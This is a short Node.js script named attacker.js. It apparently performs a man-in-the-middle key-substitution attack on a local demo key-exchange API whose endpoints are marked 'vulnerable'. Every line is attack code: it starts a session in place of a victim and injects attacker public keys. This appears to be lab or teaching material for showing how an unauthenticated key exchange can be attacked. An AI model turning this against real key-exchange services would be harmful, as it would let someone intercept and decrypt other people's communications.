// attacker.js
const axios = require('axios');

async function mitmInitiate() {
  const body = {
    responderId: "VICTIM_ID",
    publicKey: "ATTACKER_PUBLIC_KEY",
    timestamp: Date.now()
  };

  const res = await axios.post("http://localhost:5000/api/key-exchange/vulnerable/initiate", body);
  console.log("Initiate Response:", res.data);
  return res.data.sessionId;
}

async function mitmRespond(sessionId) {
  const body = {
    sessionId,
    publicKey: "ATTACKER_PUBLIC_KEY_2",
    timestamp: Date.now()
  };

  const res = await axios.post("http://localhost:5000/api/key-exchange/vulnerable/respond", body);
  console.log("Respond Response:", res.data);
}

(async () => {
  const sid = await mitmInitiate();
  await mitmRespond(sid);
})();
